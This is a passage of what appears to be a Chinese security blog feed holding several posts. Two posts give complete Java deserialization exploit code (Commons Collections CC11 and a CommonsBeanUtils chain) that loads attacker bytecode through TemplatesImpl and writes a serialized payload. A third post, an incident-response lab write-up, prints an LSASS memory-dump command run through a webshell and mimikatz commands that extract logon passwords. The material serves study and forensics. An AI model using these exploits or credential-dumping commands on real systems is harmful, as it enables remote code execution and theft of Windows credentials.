punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> priorityQueueClass <span class="token operator">=</span> priorityQueue<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> declaredField <span class="token operator">=</span> priorityQueueClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"queue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        declaredField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        declaredField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>priorityQueue<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>templates<span class="token punctuation">,</span>templates<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> comparatorClass <span class="token operator">=</span> comparator<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> declaredField1 <span class="token operator">=</span> comparatorClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"property"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        declaredField1<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        declaredField1<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>comparator<span class="token punctuation">,</span><span class="token string">"outputProperties"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">serialize</span><span class="token punctuation">(</span>priorityQueue<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        unserialize("CCTest1.txt");</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"CCTest1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> filename<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> obj <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> obj<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="/%5Cimages%5Cposts%5CShiro550%5Cimage-20240927114247996.png"></p><h3 id="CC11"><a href="#CC11" class="headerlink" title="CC11"></a>CC11</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CC11</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> templatesClass <span class="token operator">=</span> templates<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//_name赋值</span>        <span class="token class-name">Field</span> name <span class="token operator">=</span> templatesClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        name<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        name<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"doramer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> evil <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"D:\\桌面\\note\\ClassLoaderTest.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> codes <span class="token operator">=</span> <span class="token punctuation">&#123;</span>evil<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token comment">//_bytecodes赋值</span>        <span class="token class-name">Class</span> templatesClass1 <span class="token operator">=</span> templates<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> declaredField <span class="token operator">=</span> templatesClass1<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        declaredField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        declaredField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span>codes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//_tfactory赋值</span>        <span class="token class-name">Field</span> declaredField1 <span class="token operator">=</span> templatesClass1<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_tfactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        declaredField1<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        declaredField1<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        templates.newTransformer();</span>        <span class="token class-name">InvokerTransformer</span> invokerTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"newTransformer"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token string">"adad"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> templates<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        tiedMapEntry.getValue();</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> <span class="token class-name">Exp</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Exp</span><span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span> <span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        lazyMap<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 在 put 之后通过反射修改值</span>        <span class="token class-name">Class</span> lazyMapClass <span class="token operator">=</span> lazyMap<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> lazyMapClassDeclaredField <span class="token operator">=</span> lazyMapClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"factory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        lazyMapClassDeclaredField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        lazyMapClassDeclaredField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span>invokerTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Exp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        unserialize("CCTest1.txt");</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"CCTest1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> filename<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> obj <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> obj<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsBeanUtils CB链</title>
      <link href="/2024/11/11/2024-09-26-CommonsBeanUtils%20CB%E9%93%BE/"/>
      <url>/2024/11/11/2024-09-26-CommonsBeanUtils%20CB%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<p>Shiro的链子不能用数组,可以用刀这个链子.学习一下</p><h1 id="链分析"><a href="#链分析" class="headerlink" title="链分析"></a>链分析</h1><p>CommonsBeanutils 是应用于 javabean 的工具，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法</p><p>里面有个<code>PropertyUtils.getProperty</code>方法,该方法跟<code>.getName</code>类似.</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isChild</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> age <span class="token operator">&lt;=</span> <span class="token number">6</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>这里的<code>getter</code>和<code>setter</code>这种 class 就是 JavaBean.</p><p>CC4的链子:</p><pre class="language-none"><code class="language-none">TemplatesImpl#newTransformer()    TemplatesImpl#getTransletInstance()        TemplatesImpl#defineTransletClasses()            TransletClassLoader#defineClass()</code></pre><p>上半部分和CC4一样</p><pre class="language-none"><code class="language-none">public static void main(String[] args) throws IllegalAccessException, IOException, NoSuchFieldException, TransformerConfigurationException, ClassNotFoundException &#123;    TemplatesImpl templates &#x3D; new  TemplatesImpl();    Class c &#x3D; templates.getClass();    Field nameField &#x3D; c.getDeclaredField(&quot;_name&quot;);    nameField.setAccessible(true);    nameField.set(templates,&quot;admin&quot;);    Field bytecodeField &#x3D; c.getDeclaredField(&quot;_bytecodes&quot;);    bytecodeField.setAccessible(true);    byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:\\桌面\\note\\ClassLoaderTest.class\\&quot;));    byte[][] codes &#x3D; &#123;code&#125;;    bytecodeField.set(templates,codes);    Field tfactoryField &#x3D; c.getDeclaredField(&quot;_tfactory&quot;);    tfactoryField.setAccessible(true);    tfactoryField.set(templates, new TransformerFactoryImpl());    templates.newTransformer();</code></pre><p>![](\images\posts\CommonsBeanUtils CB链\image-20240926182354328.png)</p><p>在<code>TemplatesImpl</code>的<code>getOutputProperties</code>方法调用了<code>newTransformer</code>.而<code>newTransformer</code>符合<code>getProperty</code>调用的写法</p><p>(加get,i将首字母大写).所以用<code>PropertyUtils.getProperty(templates,&quot;outputProperties&quot;);</code>直接去调用也可以直接执行命令</p><pre class="language-none"><code class="language-none">   public static void main(String[] args) throws IllegalAccessException, IOException, NoSuchFieldException, TransformerConfigurationException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException &#123;        TemplatesImpl templates &#x3D; new  TemplatesImpl();        Class c &#x3D; templates.getClass();        Field nameField &#x3D; c.getDeclaredField(&quot;_name&quot;);        nameField.setAccessible(true);        nameField.set(templates,&quot;admin&quot;);        Field bytecodeField &#x3D; c.getDeclaredField(&quot;_bytecodes&quot;);        bytecodeField.setAccessible(true);        byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:\\桌面\\note\\ClassLoaderTest.class\\&quot;));        byte[][] codes &#x3D; &#123;code&#125;;        bytecodeField.set(templates,codes);        Field tfactoryField &#x3D; c.getDeclaredField(&quot;_tfactory&quot;);        tfactoryField.setAccessible(true);        tfactoryField.set(templates, new TransformerFactoryImpl());&#x2F;&#x2F;        templates.newTransformer();        PropertyUtils.getProperty(templates,&quot;outputProperties&quot;);</code></pre><p>![](\images\posts\CommonsBeanUtils CB链\image-20240926213247711.png)</p><p>继续查找调用<code>getProperty</code>.在<code>BeanComparator</code>中的<code>compare</code>方法调用了<code>getProperty</code>.这里找到<code>compare</code>是因为之前CC4链的<code>TransformingComparator</code>也调用了<code>compare</code>方法.是<code>PriorityQueue</code>的<code>readObject</code>调用的.后面的反射把值改回去就跟之前的CC2和CC4是一个意思.</p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><pre class="language-Java" data-language="Java"><code class="language-Java">package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.beanutils.BeanComparator;import javax.xml.transform.TransformerConfigurationException;import java.io.*;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class CB &#123;    public static void main(String[] args) throws IllegalAccessException, IOException, NoSuchFieldException, TransformerConfigurationException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException &#123;        TemplatesImpl templates &#x3D; new  TemplatesImpl();        Class c &#x3D; templates.getClass();        Field nameField &#x3D; c.getDeclaredField(&quot;_name&quot;);        nameField.setAccessible(true);        nameField.set(templates,&quot;admin&quot;);        Field bytecodeField &#x3D; c.getDeclaredField(&quot;_bytecodes&quot;);        bytecodeField.setAccessible(true);        byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:\\桌面\\note\\ClassLoaderTest.class\\&quot;));        byte[][] codes &#x3D; &#123;code&#125;;        bytecodeField.set(templates,codes);&#x2F;&#x2F;&#x2F;&#x2F;        Field tfactoryField &#x3D; c.getDeclaredField(&quot;_tfactory&quot;);&#x2F;&#x2F;        tfactoryField.setAccessible(true);&#x2F;&#x2F;        tfactoryField.set(templates, new TransformerFactoryImpl());&#x2F;&#x2F;        templates.newTransformer();&#x2F;&#x2F;        PropertyUtils.getProperty(templates,&quot;outputProperties&quot;);        BeanComparator comparator &#x3D; new BeanComparator();        PriorityQueue priorityQueue &#x3D; new PriorityQueue&lt;&gt;(comparator);        priorityQueue.add(1);        priorityQueue.add(2);        Class priorityQueueClass &#x3D; priorityQueue.getClass();        Field declaredField &#x3D; priorityQueueClass.getDeclaredField(&quot;queue&quot;);        declaredField.setAccessible(true);        declaredField.set(priorityQueue,new Object[]&#123;templates,templates&#125;);        Class comparatorClass &#x3D; comparator.getClass();        Field declaredField1 &#x3D; comparatorClass.getDeclaredField(&quot;property&quot;);        declaredField1.setAccessible(true);        declaredField1.set(comparator,&quot;outputProperties&quot;);        serialize(priorityQueue);        unserialize(&quot;CCTest1.txt&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;CCTest1.txt&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois &#x3D; new ObjectInputStream(new FileInputStream(filename));        Object obj &#x3D; ois.readObject();        return obj;    &#125;&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第六章 流量特征分析-蚂蚁爱上树</title>
      <link href="/2024/11/11/2024-09-24-%E7%AC%AC%E5%85%AD%E7%AB%A0%20%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E8%9A%82%E8%9A%81%E7%88%B1%E4%B8%8A%E6%A0%91/"/>
      <url>/2024/11/11/2024-09-24-%E7%AC%AC%E5%85%AD%E7%AB%A0%20%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E8%9A%82%E8%9A%81%E7%88%B1%E4%B8%8A%E6%A0%91/</url>
      
        <content type="html"><![CDATA[<h1 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h1><pre class="language-none"><code class="language-none">1. 管理员Admin账号的密码是什么？2. LSASS.exe的程序进程ID是多少？3. 用户WIN101的密码是什么?</code></pre><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p><code>http</code>过滤http的流量</p><p>一直访问了<code>action.php</code>,不过追踪后没发现攻击,在<code>onlineshop/product2.php</code>下看见shell代码</p><p>![](\images\posts\第六章 流量特征分析-蚂蚁爱上树\image-20240924145858609.png)</p><p>追踪流后发现是蚁剑连接的特征</p><p>![](\images\posts\第六章 流量特征分析-蚂蚁爱上树\image-20240924145943396.png)</p><p>搜索<code>product2.php</code>,解码base64编码内容</p><p>![](\images\posts\第六章 流量特征分析-蚂蚁爱上树\image-20240924161514609.png)</p><p>![](\images\posts\第六章 流量特征分析-蚂蚁爱上树\image-20240924161535500.png)</p><p>flag{Password1}</p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>![](\images\posts\第六章 流量特征分析-蚂蚁爱上树\image-20240924162613916.png)</p><p>![](\images\posts\第六章 流量特征分析-蚂蚁爱上树\image-20240924162555571.png)</p><p>会攻才会防<a href="https://wiki.y1ng.org/0x2_%20%E5%A8%81%E8%83%81%E7%8B%A9%E7%8C%8E/2x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-%E4%BD%BF%E7%94%A8comsvc%E2%80%8B%E2%80%8Bs.dll%E8%BD%AC%E5%82%A8Lsass.exe%E5%86%85%E5%AD%98/">T1003-win-使用comsvcs.dll转储Lsass.exe内存</a></p><p>![](\images\posts\第六章 流量特征分析-蚂蚁爱上树\image-20240924165459284.png)</p><pre class="language-none"><code class="language-none">cd &#x2F;d &quot;C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop&quot;&amp;rundll32.exe comsvcs.dll, MiniDump 852 C:\Temp\OnlineShopBackup.zip full&amp;echo [S]&amp;cd&amp;echo [E]</code></pre><p>flag{852}</p><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>dmp文件通常较大</p><p>![](\images\posts\第六章 流量特征分析-蚂蚁爱上树\image-20240924171005293.png)</p><p><code>文件</code>-&gt;<code>导出对象</code>-&gt;<code>http</code></p><p>![](\images\posts\第六章 流量特征分析-蚂蚁爱上树\image-20240924171148872.png)</p><p>下载47MB的文件,这里dmp前缀多了几个字节,删除后再用<code>mimikatz</code>打开</p><p>![](\images\posts\第六章 流量特征分析-蚂蚁爱上树\image-20240924171340812.png)</p><p>![](\images\posts\第六章 流量特征分析-蚂蚁爱上树\image-20240924171532357.png)</p><pre class="language-none"><code class="language-none">sekurlsa::minidump product2.dmpsekurlsa::logonpasswords</code></pre><p>![](\images\posts\第六章 流量特征分析-蚂蚁爱上树\image-20240924171828203.png)</p><p><a href="https://www.somd5.com/">MD5解密</a>解密</p><p>flag{admin#123}</p>]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>雷池WAF告警分析</title>
      <link href="/2024/11/11/2024-09-21-%E9%9B%B7%E6%B1%A0WAF%E5%91%8A%E8%AD%A6%E5%88%86%E6%9E%90/"/>
      <url>/2024/11/11/2024-09-21-%E9%9B%B7%E6%B1%A0WAF%E5%91%8A%E8%AD%A6%E5%88%86%E6%9E%90/</url>
      
